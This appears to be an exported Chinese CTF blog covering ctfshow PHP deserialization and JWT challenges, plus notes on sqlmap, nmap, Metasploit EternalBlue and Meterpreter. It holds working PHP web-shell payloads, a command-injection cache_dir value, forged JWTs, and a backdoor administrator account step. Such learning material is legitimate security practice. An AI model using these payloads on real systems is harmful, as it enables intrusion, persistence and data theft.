<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($u, $p)&#123;</span><br><span class="line">        $this-&gt;username = $u;</span><br><span class="line">        $this-&gt;password = $p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = new user(&#x27;shell.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);</span><br><span class="line">echo urlencode(serialize($s));</span><br></pre></td></tr></table></figure>

<p>run</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D</span><br></pre></td></tr></table></figure>

<p>蚁剑连接数据库，</p>
<p>数据库地址：locahost:3306</p>
<p>用户密码 root root ,文件下载后密码是phpcj,这个是错的，应该还没来得及改</p>
<p>打开后在sds库里看见flag</p>
<h2 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h2><p>找到写文件函数，继续找调用close()函数的类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class log&#123;</span><br><span class="line">	public $title=&#x27;log.txt&#x27;;</span><br><span class="line">	public $info=&#x27;&#x27;;</span><br><span class="line">	public function loginfo($info)&#123;</span><br><span class="line">		$this-&gt;info=$this-&gt;info.$info;</span><br><span class="line">	&#125;</span><br><span class="line">	public function close()&#123;</span><br><span class="line">		file_put_contents($this-&gt;title, $this-&gt;info);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个类里面还含有可调用的__construct()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class dao&#123;</span><br><span class="line">	private $config;</span><br><span class="line">	private $conn;</span><br><span class="line"></span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;config=new config();</span><br><span class="line">		$this-&gt;init();</span><br><span class="line">	&#125;</span><br><span class="line">	private function init()&#123;</span><br><span class="line">		$this-&gt;conn=new mysqli($this-&gt;config-&gt;get_mysql_host(),$this-&gt;config-&gt;get_mysql_username(),$this-&gt;config-&gt;get_mysql_password(),$this-&gt;config-&gt;get_mysql_db());</span><br><span class="line">	&#125;</span><br><span class="line">	public function __destruct()&#123;</span><br><span class="line">		$this-&gt;conn-&gt;close();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>search unserialize</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$user = unserialize(base64_decode($_COOKIE[&#x27;user&#x27;]));</span><br><span class="line">if($user)&#123;</span><br><span class="line">	header(&quot;location:index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>poc脚本，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class dao&#123;</span><br><span class="line">    private $conn;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;conn=new log();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class log&#123;</span><br><span class="line">    public $title=&#x27;a.php&#x27;;</span><br><span class="line">    public $info=&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>cookie传参到index.php</p>
<p>访问a.php即可</p>
<h2 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h2><p>search file_put_contents</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function closelog()&#123;</span><br><span class="line">		file_put_contents($this-&gt;title, $this-&gt;info);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>但是没搜到closelog</p>
<p>所以用不了，换命令执行幻术</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">passthru()</span><br><span class="line">pcntl_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br></pre></td></tr></table></figure>

<p>找到了shell_exec，在dao.php中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function  clearCache()&#123;</span><br><span class="line">		shell_exec(&#x27;rm -rf ./&#x27;.$this-&gt;config-&gt;cache_dir.&#x27;/*&#x27;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>搜索一下clearCache，在service.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function clearCache()&#123;</span><br><span class="line">	$this-&gt;dao-&gt;clearCache();</span><br></pre></td></tr></table></figure>

<p>看到在logout.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$service = unserialize(base64_decode($_COOKIE[&#x27;service&#x27;]));</span><br><span class="line">if($service)&#123;</span><br><span class="line">	$service-&gt;clearCache();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://d8c4084b-f6f8-423c-b148-752d4b81eef8.challenge.ctf.show/controller/logout.php</span><br></pre></td></tr></table></figure>

<p>我试了试火狐的hackbar不是很好用，cookie传参穿了好久都没进去。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class config&#123;</span><br><span class="line">    public $cache_dir = &#x27;;echo \&#x27;&lt;?php eval($_POST[1]);?&gt;\&#x27; &gt; 1.php;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;config=new config();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>同样生成的1.php也在controller下</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service=TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDE6IjtlY2hvICc8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4nID4gMS5waHA7Ijt9fQ==</span><br></pre></td></tr></table></figure>

<p>ctfshow{b1869c93-377b-4431-8257-c7475286bb2e}</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>jwt</title>
    <url>/2023/03/15/jwt/</url>
    <content><![CDATA[<p>   ctfshow jwt</p>
<p>​    <span id="more"></span></p>
<p>jwt和cookie都是成功登录后服务器端返回客户端的一段数据， 下次登录时避免重新输入账号密码之类，提高用户体验<br>cookie本身不具有危害性，但是通过其他手段xss等获取到对方相关网站的cookie后，即可实现免密码登录，<br>jwt由于加密的特殊性可能会造成越权登录，越权修改等危害<br>jwt语句很好辨认，主要有三部分组成，前两部分由base64加密，最后一段为key加密(可以理解为md5加盐加密)，中间使用点.截断，并且前两位字符为ew（{），一般存在于请求包（返回包）中的cookie属性值中<br><a href="https://blog.csdn.net/qq_54030686/article/details/122550173">https://blog.csdn.net/qq_54030686/article/details/122550173</a></p>
<p>jwt由三部分组成<a href="https://so.csdn.net/so/search?q=header&spm=1001.2101.3001.7020">header</a>、payload、signature</p>
<p>jwt解密网站<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p>
<h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;None&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;jwt&quot;</span><br><span class="line">&#125;</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;iss&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;iat&quot;: 1678972257,</span><br><span class="line">    &quot;exp&quot;: 1678979457,</span><br><span class="line">    &quot;nbf&quot;: 1678972257,</span><br><span class="line">    &quot;sub&quot;: &quot;user&quot;,  //修改为admin</span><br><span class="line">    &quot;jti&quot;: &quot;9cf456cedd0952af77d1abc40b53c4da&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>bp抓url&#x2F;admin的包得到cookie值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;</span><br><span class="line">&#125;</span><br><span class="line">标准中注册的声明 (建议但不强制使用) </span><br><span class="line"># iss: jwt签发者</span><br><span class="line"># sub: jwt所面向的用户</span><br><span class="line"># aud: 接收jwt的一方</span><br><span class="line"># exp: jwt的过期时间，这个过期时间必须要大于签发时间</span><br><span class="line"># nbf: 定义在什么时间之前，该jwt都是不可用的</span><br><span class="line"># iat: jwt的签发时间</span><br><span class="line"># jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</span><br></pre></td></tr></table></figure>

<p>后base64加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJqd3QiCn0KWwogIHsKICAgICJpc3MiOiAiYWRtaW4iLAogICAgImlhdCI6IDE2Nzg5NzIyNTcsCiAgICAiZXhwIjogMTY3ODk3OTQ1NywKICAgICJuYmYiOiAxNjc4OTcyMjU3LAogICAgInN1YiI6ICJhZG1pbiIsICAKICAgICJqdGkiOiAiOWNmNDU2Y2VkZDA5NTJhZjc3ZDFhYmM0MGI1M2M0ZGEiCiAgfQpd</span><br></pre></td></tr></table></figure>

<p>发送</p>
<p>ctfshow{0f11af98-e3f2-4f85-b8f6-1a6e5e29e8ab}</p>
<h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>密码是123456</p>
<p>ctfshow{d0771945-aa69-41d1-97b2-5560debfa46f}</p>
<h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>同上</p>
<h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>c-jwt-cracker使用</p>
<p>“alg”: “HS256”,为对称加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3OTA1ODI4NywiZXhwIjoxNjc5MDY1NDg3LCJuYmYiOjE2NzkwNTgyODcsInN1YiI6InVzZXIiLCJqdGkiOiI1ZmNhNmQ2N2YzOGI0YWM0MmFhMThiMTA0NTcwMjNmNCJ9.PO3xD4-JJArJXohbOhKr93x8exeCRFMg8XV8yGYGZSE</span><br></pre></td></tr></table></figure>

<p>爆破出来密码为aaab</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3OTA1ODI4NywiZXhwIjoxNjc5MDY1NDg3LCJuYmYiOjE2NzkwNTgyODcsInN1YiI6ImFkbWluIiwianRpIjoiNWZjYTZkNjdmMzhiNGFjNDJhYTE4YjEwNDU3MDIzZjQifQ.psZF-TG9DIQKj_GHhyHGXwoGITOJI7Lhf3vP9n2iyRA</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/brendan-rius/c-jwt-cracker">GitHub - brendan-rius&#x2F;c-jwt-cracker：用 C 编写的 JWT 蛮力破解器</a></p>
<p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
<p>具体安装看ubuntu</p>
<p>ctfshow{138f48e1-f877-49fe-938f-94e0143ec751}</p>
<h2 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h2>]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>kali工具</title>
    <url>/2023/04/03/kali%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[  <span id="more"></span>

<h2 id="蚁剑下载"><a href="#蚁剑下载" class="headerlink" title="蚁剑下载"></a>蚁剑下载</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gitee.com/AntSwordProject/AntSword-Loader</span><br></pre></td></tr></table></figure>

<h2 id="behinder使用"><a href="#behinder使用" class="headerlink" title="behinder使用"></a>behinder使用</h2><p>下载地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder/releases</span><br></pre></td></tr></table></figure>

<p>由于自己再windos下弄不好决定弄到kali上，kali没有java环境需要配置java环境</p>
<p>下载解压，在目录里打开终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br></pre></td></tr></table></figure>

<p>behinder 普通的后门是用不了只能用behinder的后门连接</p>
<h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><p>sqlmap常用命令总结：<br>注意：命令为kali linux中运行的 （windows中用python sqlmap.py执行）</p>
<p>1#、注入六连：</p>
<ol>
<li><p>sqlmap -u  “<a href="http://www.xx.com/?id=x">http://www.xx.com?id=x</a>“    【查询是否存在注入点</p>
</li>
<li><p>–dbs         【检测站点包含哪些数据库</p>
</li>
<li><p>–current-db    【获取当前的数据库名</p>
</li>
<li><p>–tables -D “db_name”  【获取指定数据库中的表名 -D后接指定的数据库名称</p>
</li>
<li><p>–columns  -T “table_name” -D “db_name”  【获取数据库表中的字段</p>
</li>
<li><p>–dump -C “columns_name” -T “table_name” -D “db_name”  【获取字段的数据内容</p>
</li>
</ol>
<p>2#、COOKIE注入：<br>sqlmap -u “<a href="http://www.xx.com/?id=x">http://www.xx.com?id=x</a>“ –cookie “cookie” –level 2  【cookie注入 后接cookie值</p>
<p>3#、POST注入：<br>（1）目标地址http:&#x2F;&#x2F; <a href="http://www.xxx.com/">www.xxx.com</a> &#x2F;login.asp<br>（2）打开brup代理。<br>（3）点击表单提交<br>（4）burp获取拦截信息（post）<br>（5）右键保存文件（.txt）到指定目录下<br>（6）运行sqlmap并执行如下命令：<br>用例：sqlmap -r okay.txt  -p  username</p>
<p>&#x2F;&#x2F; -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）</p>
<p>（7）自动获取表单：–forms自动获取表单</p>
<p>例如：sqlmap -u <a href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> –forms</p>
<p>（8）指定参数搜索：–data</p>
<p>例如:sqlmap -u <a href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> –data “username&#x3D;1”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u 指定目标URL (可以是http协议也可以是https协议)</span><br><span class="line"> </span><br><span class="line">-d 连接数据库</span><br><span class="line"> </span><br><span class="line">--dbs 列出所有的数据库</span><br><span class="line"> </span><br><span class="line">--current-db 列出当前数据库</span><br><span class="line"> </span><br><span class="line">--tables 列出当前的表</span><br><span class="line"> </span><br><span class="line">--columns 列出当前的列</span><br><span class="line"> </span><br><span class="line">-D 选择使用哪个数据库</span><br><span class="line"> </span><br><span class="line">-T 选择使用哪个表</span><br><span class="line"> </span><br><span class="line">-C 选择使用哪个列</span><br><span class="line"> </span><br><span class="line">--dump 获取字段中的数据</span><br><span class="line"> </span><br><span class="line">--batch 自动选择yes</span><br><span class="line"> </span><br><span class="line">--smart 启发式快速判断，节约浪费时间</span><br><span class="line"> </span><br><span class="line">--forms 尝试使用post注入</span><br><span class="line"> </span><br><span class="line">-r 加载文件中的HTTP请求（本地保存的请求包txt文件）</span><br><span class="line"> </span><br><span class="line">-l 加载文件中的HTTP请求（本地保存的请求包日志文件）</span><br><span class="line"> </span><br><span class="line">-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试</span><br><span class="line"> </span><br><span class="line">-o 开启所有默认性能优化</span><br><span class="line"> </span><br><span class="line">--tamper 调用脚本进行注入</span><br><span class="line"> </span><br><span class="line">-v 指定sqlmap的回显等级</span><br><span class="line"> </span><br><span class="line">--delay 设置多久访问一次</span><br><span class="line"> </span><br><span class="line">--os-shell 获取主机shell，一般不太好用，因为没权限</span><br><span class="line"> </span><br><span class="line">-m 批量操作</span><br><span class="line"> </span><br><span class="line">-c 指定配置文件，会按照该配置文件执行动作</span><br><span class="line"> </span><br><span class="line">-data data指定的数据会当做post数据提交</span><br><span class="line"> </span><br><span class="line">-timeout 设定超时时间</span><br><span class="line"> </span><br><span class="line">--level 设置注入探测等级</span><br><span class="line"> </span><br><span class="line">--risk 风险等级</span><br><span class="line"> </span><br><span class="line">--identify-waf 检测防火墙类型</span><br><span class="line"> </span><br><span class="line">--param-del=&quot;分割符&quot; 设置参数的分割符</span><br><span class="line"> </span><br><span class="line">--skip-urlencode 不进行url编码</span><br><span class="line"> </span><br><span class="line">--keep-alive 设置持久连接，加快探测速度</span><br><span class="line"> </span><br><span class="line">--null-connection 检索没有body响应的内容，多用于盲注</span><br><span class="line"> </span><br><span class="line">--thread 最大为10 设置多线程</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/songbai220/article/details/109303110">(10条消息) sqlmap使用教程(超详细)_Redmaple925的博客-CSDN博客</a></p>
<h2 id="nmap使用"><a href="#nmap使用" class="headerlink" title="nmap使用"></a>nmap使用</h2><p>nmap常用命令<br>主机发现 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描</span><br><span class="line">-sn                     ping扫描,即主机发现</span><br><span class="line">-Pn                     不检测主机存活</span><br><span class="line">-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现</span><br><span class="line">-PE/PP/PM               使用ICMP echo, timestamp and netmask 请求包发现主机</span><br><span class="line">-PO[prococol list]      使用IP协议包探测对方主机是否开启   </span><br><span class="line">-n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析</span><br></pre></td></tr></table></figure>

<p>awd主机发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=open(&#x27;pingtest.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">for i in range(255):</span><br><span class="line">    ip = &quot;192-168-1-&quot; + str(i) +&quot;.pvp2155.bugku.cn&quot;</span><br><span class="line">    f.write(ip+&#x27;\n&#x27;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>批量扫描存货主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -iL /home/zhou/桌面/pingtest.txt -sn</span><br></pre></td></tr></table></figure>



<h2 id="dirsearch使用"><a href="#dirsearch使用" class="headerlink" title="dirsearch使用"></a>dirsearch使用</h2><p>常用于暴力扫描页面结构，包括网页中的目录和文件</p>
<p>简单使用</p>
<p>-u,–url                    目标url<br>-l,–url-list&#x3D;FILE          目标url文件路径<br>–stdin                     从标准输入中指定url<br>–cidr                      目标网段<br>–raw&#x3D;File                  从文件中读取request报文,通过-schema指定策略(如–schema https)</p>
<p><a href="https://so.csdn.net/so/search?q=dirsearch&t=&u=&urw=">dirsearch- CSDN搜索</a> </p>
<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>永恒之蓝</p>
<p>windos7镜像下载</p>
<p><a href="https://www.imsdn.cn/windows-server/windows-server-2008-r2/">Windows Server 2008 R2 ISO镜像下载 - 我的MSDN (imsdn.cn)</a></p>
<p>1.启动msf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p>2.搜索可以用的模板</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 3   #使用auxiliary/scanner/smb/smb_ms17_010  进行扫描是否存在MS17-010漏洞</span><br><span class="line">show options   #查看需要设置的参数</span><br><span class="line">set rhosts 192.168.158.150</span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<p>若存在如上图所示</p>
<ol start="4">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use 0 #exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码</span><br><span class="line">show options   #查看需要设置的参数</span><br><span class="line">set rhosts 192.168.158.150 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>攻击完成</p>
<p>5.显示   win  字样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell    #进入命令行</span><br><span class="line">chcp 65001    ##切换编码，解决乱码问题</span><br><span class="line">exit   #离开shell</span><br><span class="line">background #把我们获得的meterpreter会话挂载到后台运行</span><br><span class="line">sessions   #显示所有会话</span><br><span class="line">sessions id   #进入会话</span><br></pre></td></tr></table></figure>



<ol start="6">
<li></li>
</ol>
<p>1、创建新用户 ，语法：net user 用户名 密码 &#x2F;add</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user sss @123qwe /add</span><br><span class="line">net localgroup administrators sss /add  #将用户sss添加至管理员组</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Meterpreter &gt; ?</span><br><span class="line">==========================================</span><br><span class="line">核心命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">?                             帮助菜单</span><br><span class="line">background                    把当前会话挂到后台运行</span><br><span class="line">bg                            background命令的别名</span><br><span class="line">bgkill                        杀死后台meterpreter 脚本</span><br><span class="line">bglist                        列出正在运行的后台脚本</span><br><span class="line">bgrun                         执行一个meterpreter脚本作为后台线程</span><br><span class="line">channel                       显示信息或控制活动频道</span><br><span class="line">close                         关闭一个频道</span><br><span class="line">detach                        分离Meterpreter会话（用于 http/https）</span><br><span class="line">disable_unicode_encoding      禁用 unicode 字符串的编码</span><br><span class="line">enable_unicode_encoding       启用 unicode 字符串的编码</span><br><span class="line">exit                          终止 Meterpreter 会话</span><br><span class="line">get_timeouts                  获取当前会话超时值</span><br><span class="line">guid                          获取会话 GUID</span><br><span class="line">help                          帮助菜单</span><br><span class="line">info                          显示有关 Post 模块的信息</span><br><span class="line">irb                           在当前会话中打开一个交互式 Ruby shell</span><br><span class="line">load                          加载一个或多个 Meterpreter 扩展</span><br><span class="line">machine_id                    获取连接到会话的机器的 MSF ID</span><br><span class="line">migrate                       将服务器迁移到另一个进程</span><br><span class="line">pivot                         管理枢轴侦听器</span><br><span class="line">pry                           在当前会话上打开 Pry 调试器</span><br><span class="line">quit                          终止 Meterpreter 会话</span><br><span class="line">read                          从通道读取数据</span><br><span class="line">resource                      运行存储在文件中的命令</span><br><span class="line">run                           执行一个 Meterpreter 脚本或 Post 模块</span><br><span class="line">secure                       （重新）协商会话上的 TLV 数据包加密</span><br><span class="line">sessions                      快速切换到另一个会话</span><br><span class="line">set_timeouts                  设置当前会话超时值</span><br><span class="line">sleep                         强制 Meterpreter 安静，然后重新建立会话</span><br><span class="line">ssl_verify                    修改 SSL 证书验证设置</span><br><span class="line">transport                     管理运输机制</span><br><span class="line">use                           不推荐使用的load命令别名</span><br><span class="line">uuid                          获取当前会话的 UUID</span><br><span class="line">write                         将数据写入通道</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：文件系统命令</span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">cat                           将文件内容读到屏幕上</span><br><span class="line">cd                            切换目录</span><br><span class="line">checksum                      检索文件的校验和</span><br><span class="line">cp                            将源复制到目标</span><br><span class="line">del                           删除指定文件</span><br><span class="line">dir                           列出文件（ls 的别名）</span><br><span class="line">download                      下载文件或目录</span><br><span class="line">edit                          编辑文件</span><br><span class="line">getlwd                        打印本地工作目录</span><br><span class="line">getwd                         打印工作目录</span><br><span class="line">lcd                           更改本地工作目录</span><br><span class="line">lls                           列出本地文件</span><br><span class="line">lpwd                          打印本地工作目录</span><br><span class="line">ls                            列出文件</span><br><span class="line">mkdir                         制作目录</span><br><span class="line">mv                            将源移动到目标</span><br><span class="line">pwd                           打印工作目录</span><br><span class="line">rm                            删除指定文件</span><br><span class="line">rmdir                         删除目录</span><br><span class="line">search                        搜索文件</span><br><span class="line">show_mount                    列出所有挂载点/逻辑驱动器</span><br><span class="line">upload                        上传文件或目录</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">arp                           显示主机 ARP 缓存</span><br><span class="line">getproxy                      显示当前代理配置</span><br><span class="line">ifconfig                      显示界面</span><br><span class="line">ipconfig                      显示接口</span><br><span class="line">netstat                       显示网络连接</span><br><span class="line">portfwd                       将本地端口转发到远程服务</span><br><span class="line">resolve                       解析目标上的一组主机名</span><br><span class="line">route                         查看和修改路由表</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：系统命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">clearev                       清除事件日志</span><br><span class="line">drop_token                    放弃任何活动的模拟令牌。</span><br><span class="line">execute                       执行命令</span><br><span class="line">getenv                        获取一个或多个环境变量值</span><br><span class="line">getpid                        获取当前进程标识符</span><br><span class="line">getprivs                      尝试启用当前进程可用的所有权限</span><br><span class="line">getid                         获取服务器运行的用户的 SID</span><br><span class="line">getuid                        获取服务器运行的用户</span><br><span class="line">kill                          终止进程</span><br><span class="line">localtime                     显示目标系统本地日期和时间</span><br><span class="line">pgrep                         按名称过滤进程</span><br><span class="line">pkill                         按名称终止进程</span><br><span class="line">ps                            列出正在运行的进程</span><br><span class="line">reboot                        重启远程计算机</span><br><span class="line">reg                           修改远程注册表并与之交互</span><br><span class="line">rev2self                      在远程机器上调用 RevertToSelf()</span><br><span class="line">shell                         放入系统命令 shell</span><br><span class="line">shutdown                      关闭远程计算机</span><br><span class="line">steal_token                   尝试从目标进程窃取模拟令牌</span><br><span class="line">suspend                       暂停或恢复进程列表</span><br><span class="line">sysinfo                       获取有关远程系统的信息，例如 OS</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：用户界面命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">enumdesktops                  列出所有可访问的桌面和窗口站</span><br><span class="line">getdesktop                    获取当前的meterpreter桌面</span><br><span class="line">idletime                      返回远程用户空闲的秒数</span><br><span class="line">keyboard_send                 发送击键</span><br><span class="line">keyevent                      发送按键事件</span><br><span class="line">keyscan_dump                  转储击键缓冲区</span><br><span class="line">keyscan_start                 开始捕获击键</span><br><span class="line">keyscan_stop                  停止捕获击键</span><br><span class="line">mouse                         发送鼠标事件</span><br><span class="line">screenshare                   实时观看远程用户桌面</span><br><span class="line">screenshot                    抓取交互式桌面的截图</span><br><span class="line">setdesktop                    更改meterpreters当前桌面</span><br><span class="line">uictl                         控制一些用户界面组件</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络摄像头命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">record_mic                    从默认麦克风录制音频 X 秒</span><br><span class="line">webcam_chat                   开始视频聊天</span><br><span class="line">webcam_list                   列出网络摄像头</span><br><span class="line">webcam_snap                   从指定的网络摄像头拍摄快照</span><br><span class="line">webcam_stream                 从指定的网络摄像头播放视频流</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：音频输出命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">play                          在目标系统上播放波形音频文件 (.wav)</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：权限提升命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">getsystem                     尝试将您的权限提升到本地系统的权限。</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：密码数据库命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">hashdump                      转储 SAM 数据库的内容</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：Timestomp 命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">timestomp                     操作文件 MACE 属性</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618">(4条消息) 【工具使用】——Metasploit(MSF)使用详解(超详细)_metasploit使用教程_剑客 getshell的博客-CSDN博客</a></p>
